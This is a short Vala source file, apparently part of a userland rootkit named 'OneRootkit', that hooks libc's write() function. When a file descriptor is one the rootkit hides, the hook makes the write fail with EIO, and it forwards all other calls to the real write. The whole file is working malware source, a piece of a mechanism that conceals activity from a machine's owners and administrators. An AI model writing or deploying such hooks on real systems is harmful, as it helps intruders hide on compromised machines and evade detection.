using Posix;

delegate unowned ssize_t WriteMethod(int fd, void* buf, size_t nbyte);

public static ssize_t write(int fd, void* buf, size_t nbyte) 
{
	WriteMethod oldWrite = (WriteMethod) DLHandles.LIBC().GetMethod("write");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.EIO;
		return -1;
	}

	return oldWrite(fd, buf, nbyte);
}